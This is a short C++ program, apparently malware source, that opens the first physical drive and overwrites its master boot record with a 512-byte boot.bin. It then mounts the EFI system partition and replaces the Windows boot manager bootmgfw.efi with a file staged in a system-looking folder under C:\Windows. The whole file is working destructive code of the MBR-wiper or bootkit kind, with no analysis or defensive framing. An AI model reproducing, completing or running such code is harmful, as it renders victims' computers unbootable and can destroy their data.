// GoodbyeMBR.cpp : This file contains the 'main' function. Program execution begins and ends there.
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <iostream>
#include <Windows.h>

int main()
{
    // Overwrite the MBR
    HANDLE drive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive == INVALID_HANDLE_VALUE) {
        printf("Error opening a handle to the drive.");
        return -1;
    }

    HANDLE binary = CreateFileW(L"C:\\Windows\\SystemUpdateResources\\boot.bin", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
    if (binary == INVALID_HANDLE_VALUE) {
        printf("Error opening a handle to boot.bin");
        return -1;
    }

    DWORD size = GetFileSize(binary, 0);
    if (size != 512) {
        printf("Error opening a handle to boot.bin");
        return -1;
    }

    byte* new_mbr = new byte[size];
    DWORD bytes_read;
    if (ReadFile(binary, new_mbr, size, &bytes_read, 0))
    {
        if (WriteFile(drive, new_mbr, size, &bytes_read, 0))
        {
            printf("First sector overwritten successfully!\n");
        }
    }
    else
    {
        printf("Error reading boot.bin\n");
        printf("Make sure to compile the ASM file with 'nasm -f bin -o boot.bin boot.asm'\n");
    }

    // Close handles for MBR write process
    CloseHandle(binary);
    CloseHandle(drive);

    // Mount EFI System Partition
    printf("Mounting EFI System Partition...\n");
    system("mountvol x: /s");

    // Copy bootmgfw.efi to X:\EFI\Microsoft\Boot
    printf("Copying bootmgfw.efi to X:\\EFI\\Microsoft\\Boot\\...\n");
    if (CopyFile(L"C:\\Windows\\SystemUpdateResources\\bootmgfw.efi", L"X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi", FALSE))
    {
        printf("bootmgfw.efi copied successfully!\n");
    }
    else
    {
        printf("Failed to copy bootmgfw.efi.\n");
    }

    return 0;
}
